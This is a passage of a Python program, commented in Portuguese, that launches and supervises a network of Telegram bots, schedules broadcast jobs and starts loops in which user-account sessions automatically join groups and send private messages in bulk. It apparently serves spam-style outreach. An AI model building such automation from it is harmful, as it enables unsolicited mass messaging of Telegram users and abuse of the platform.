                    f"📊 Pedidos na fila: {len(approver_pending)}",
                    parse_mode="Markdown"
                )

            app.add_handler(CommandHandler("start", approver_start))
            app.add_handler(ChatJoinRequestHandler(on_approver_join_request))
            app.job_queue.run_repeating(approver_check, interval=15, first=15)
            logger.info(f"✅ Bot Aprovador '{bot_name}' (ID:{bot_id}) iniciado!")

        elif bot_type == 'chatflow':
            app.add_handler(CommandHandler("start", chatflow_start))
            app.add_handler(CommandHandler("menu", child_admin_menu))
            app.add_handler(CommandHandler("setdisparo", child_cmd_setdisparo))
            app.add_handler(CommandHandler("setintervalo", child_cmd_setintervalo))
            app.add_handler(CallbackQueryHandler(child_callback))
            app.add_handler(MessageHandler(filters.CONTACT, chatflow_contact))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chatflow_text))
            app.add_handler(ChatJoinRequestHandler(chatflow_join_request))
            logger.info(f"💬 Bot Fluxo Chat '{bot_name}' (ID:{bot_id}) iniciado!")
        else:
            app.add_handler(CommandHandler("start", child_start))
            app.add_handler(CommandHandler("menu", child_admin_menu))
            app.add_handler(CommandHandler("setdisparo", child_cmd_setdisparo))
            app.add_handler(CommandHandler("setintervalo", child_cmd_setintervalo))
            app.add_handler(CallbackQueryHandler(child_callback))
            app.add_handler(MessageHandler(filters.CONTACT, miniapp_delete_contact))
            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, child_text))
            app.add_handler(ChatJoinRequestHandler(child_join_request))
            logger.info(f"🤖 Bot Filho '{bot_name}' (ID:{bot_id}) iniciado!")

        if bot_type != 'approver':
            config = get_bot_cfg(bot_id)
            intervalo = int(config.get('intervalo_horas', '1')) * 3600
            first_delay = _proximo_offset_disparo()
            logger.info(f"[Disparo] {bot_name} agendado a cada {intervalo//3600}h, primeira execução em {first_delay}s")
            app.job_queue.run_repeating(disparo_job, interval=intervalo, first=first_delay)

        await app.initialize()
        await app.start()
        await app.updater.start_polling(drop_pending_updates=True)
        while True:
            await asyncio.sleep(3600)

    def _thread_run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run())
        except Exception as e:
            logger.error(f"Erro bot filho {bot_name}: {e}")

    thread = threading.Thread(target=_thread_run, daemon=True)
    thread.start()
    running_child_bots[bot_id] = thread
    logger.info(f"Bot filho {bot_name} iniciado em thread")

def cleanup_invalid_bots():
    bots = db.get_all_bots()
    removed = 0
    for bot in bots:
        token = bot.get('token', '')
        bot_id = str(bot['_id'])
        bot_name = bot.get('name', 'Bot')
        try:
            resp = http_requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
            if resp.status_code == 401:
                logger.info(f"Token inválido detectado: {bot_name} - removendo do banco...")
                if bot_id in running_child_bots:
                    running_child_bots.pop(bot_id, None)
                db.deactivate_bot(bot_id)
                removed += 1
        except Exception as e:
            logger.error(f"Erro verificando bot {bot_name}: {e}")
    if removed > 0:
        logger.info(f"Removidos {removed} bots com token inválido")
    else:
        logger.info("Todos os bots têm tokens válidos")
    return removed

def start_all_child_bots():
    cleanup_invalid_bots()
    bots = db.get_all_bots()
    if not bots:
        logger.info("Nenhum bot filho cadastrado")
        return
    logger.info(f"Iniciando {len(bots)} bots filhos...")
    for bot in bots:
        start_single_child_bot(bot)

def auto_grupo_loop():
    import time
    time.sleep(120)
    while True:
        try:
            logger.info("[AutoGrupo] Iniciando busca de grupos...")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(session_entrar_grupos())
            loop.close()
        except Exception as e:
            logger.error(f"[AutoGrupo] Erro no loop: {e}")
        time.sleep(3600 * 2)


def auto_pv_loop():
    time.sleep(300)
    while True:
        try:
            logger.info("[AutoPV] Iniciando envio de PVs...")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(session_pv_automatico())
            loop.close()
        except Exception as e:
            logger.error(f"[AutoPV] Erro no loop: {e}")
        time.sleep(3600 * 3)


def check_new_bots_loop():
    while True:
        time.sleep(60)
        try:
            bots = db.get_all_bots()
            for bot in bots:
                if str(bot['_id']) not in running_child_bots:
                    logger.info(f"Novo bot detectado: {bot.get('name')}")
                    start_single_child_bot(bot)
        except:
            pass

def run_pai_bot(public_ip=None):
    async def _run_pai():
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", pai_start))
        app.add_handler(CommandHandler("menu", pai_admin_menu))
        app.add_handler(CommandHandler("ip", pai_cmd_ip))
        app.add_handler(CommandHandler("setdisparo", pai_cmd_setdisparo))
        app.add_handler(CommandHandler("setintervalo", pai_cmd_setintervalo))
        app.add_handler(CallbackQueryHandler(pai_callback))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, pai_text))
        app.add_handler(ChatJoinRequestHandler(pai_join_request))

        # Não consulta o Mongo no boot: o Bot Pai precisa iniciar e entregar
        # o IP mesmo enquanto a lista de acesso ainda bloqueia o Publish.
        config = dict(DEFAULT_CONFIG)
        intervalo = int(config.get('intervalo_horas', '1')) * 3600
        app.job_queue.run_repeating(disparo_job, interval=intervalo, first=10)

        logger.info("🤖 Bot Pai iniciado!")
        await app.initialize()
        await app.start()
        if public_ip:
            try:
                environment = "PUBLISH" if os.getenv("REPLIT_DEPLOYMENT") == "1" else "DESENVOLVIMENTO"
                await app.bot.send_message(
                    ADMIN_ID,
                    f"🌍 IP PÚBLICO DO {environment}:\n\n"
                    f"{public_ip}\n\n"
                    "Adicione este IP na lista de acesso do MongoDB.\n"
                    "O sistema continuará tentando reconectar enquanto estiver bloqueado."
                )
                logger.info("📨 IP público enviado ao administrador pelo Bot Pai.")
            except Exception as e:
                logger.warning(f"Não foi possível enviar o IP pelo Bot Pai: {type(e).__name__}")
        await app.updater.start_polling(drop_pending_updates=True)
        while True:
            await asyncio.sleep(3600)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_run_pai())
    except Exception as e:
        logger.error(f"Erro bot pai: {e}")

def initialize_services():
    """Aguarda o acesso ao Mongo antes de iniciar os bots."""
    public_ip = log_public_ip()

    if BOT_TOKEN:
        threading.Thread(target=run_pai_bot, args=(public_ip,), daemon=True).start()
        logger.info("Bot Pai iniciando para informar o IP público...")

    logger.info("🔌 Verificando acesso ao MongoDB...")

    while not db.check_connection():
        if public_ip:
            logger.error(
                f"⏳ MongoDB bloqueou o acesso. Libere o IP {public_ip}; "
                "nova tentativa em 15s."
            )
        else:
            logger.error("⏳ MongoDB indisponível; nova tentativa em 15s.")
        time.sleep(15)

    logger.info("✅ MongoDB conectado; iniciando serviços...")

    # Limpa locks de session que ficaram travados de execuções anteriores
    try:
        db.reset_all_session_locks()
        logger.info("🔓 Locks de session liberados (boot)")
    except Exception as e:
        logger.error(f"Erro reset locks: {e}")

    start_all_child_bots()
    threading.Thread(target=check_new_bots_loop, daemon=True).start()
    threading.Thread(target=start_cleanup_loop, daemon=True).start()
    threading.Thread(target=auto_grupo_loop, daemon=True).start()
    threading.Thread(target=auto_pv_loop, daemon=True).start()
    logger.info("🧹 Limpeza automática de verificações iniciada")
    logger.info("🔄 AutoGrupo iniciado (a cada 2h)")
    logger.info("📨 AutoPV iniciado (a cada 3h, max 3 users/session)")


if __name__ == "__main__":
    ensure_telethon_loop()
    ensure_chatflow_loop()

    # O servidor web sobe imediatamente para o healthcheck; os bots aguardam
    # o MongoDB ficar acessível e tentam novamente caso o IP esteja bloqueado.
    threading.Thread(target=initialize_services, daemon=True).start()

    logger.info("🌐 Servidor Flask iniciando na porta 5000...")
    flask_app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
